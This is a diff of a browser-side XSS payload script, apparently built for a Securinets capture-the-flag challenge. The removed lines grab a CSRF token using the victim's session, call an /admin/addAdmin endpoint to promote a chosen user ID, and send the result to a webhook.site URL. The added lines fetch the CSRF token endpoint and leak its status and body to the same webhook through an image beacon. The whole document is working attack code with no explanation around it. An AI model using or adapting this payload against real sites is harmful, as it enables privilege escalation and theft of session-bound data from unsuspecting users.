@@ -1,49 +1,20 @@
 <script>
 (async () => {
+  const WEBHOOK = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160';
+  const FALLBACK = 'https://web1-79e4a3bc.p1.securinets.tn';
   try {
-    const FALLBACK = 'https://web1-79e4a3bc.p1.securinets.tn';
-    const WEBHOOK = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160';
-    const TARGET_USER_ID = 278;
-
-    // build base without credentials
     const base = (typeof location !== 'undefined' && location.hostname)
       ? (location.protocol + '//' + location.hostname + (location.port ? ':' + location.port : ''))
       : FALLBACK;
 
-    // fetch csrf token
-    const tokRes = await fetch(base + '/csrf-token', { credentials: 'include' });
-    let tokJson;
-    try {
-      tokJson = await tokRes.clone().json();
-    } catch (e) {
-      // if not JSON, try text parsing fallback (not shown here for brevity)
-      const txt = await tokRes.text();
-      // simple fallback: try to extract token from common patterns
-      const m1 = txt.match(/"csrfToken"\s*:\s*"([^"]+)"/) || txt.match(/name=["']csrf-token["'][^>]+content=["']([^"']+)["']/i);
-      if (m1) tokJson = { csrfToken: m1[1] };
-      else tokJson = {};
-    }
-
-    // Use csrfToken field first, then other common names
-    const csrf = tokJson.csrfToken || tokJson.csrf || tokJson._csrf || tokJson.CSRF || tokJson.csrfTokenId || tokJson.token || tokJson.tokenId;
-    if (!csrf) throw new Error('no-csrf-found');
-
-    // perform the privileged POST to promote
-    const promoteRes = await fetch(base + '/admin/addAdmin', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {
-        'Content-Type': 'application/json',
-        'CSRF-Token': csrf
-      },
-      body: JSON.stringify({ userId: TARGET_USER_ID })
-    });
-
-    const promoteText = await promoteRes.text();
-    // exfiltrate response
-    new Image().src = WEBHOOK + '?res=' + encodeURIComponent(promoteText);
-  } catch (err) {
-    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(err.message);
+    const r = await fetch(base + '/csrf-token', { credentials: 'include' });
+    const status = r.status;
+    const body = await r.text();
+    // limit the size to avoid overly long URLs
+    const short = encodeURIComponent(body).slice(0, 4000);
+    new Image().src = WEBHOOK + '?tok_status=' + status + '&tok_body=' + short;
+  } catch (e) {
+    new Image().src = WEBHOOK + '?err=' + encodeURIComponent(e.message);
   }
 })();
 </script>
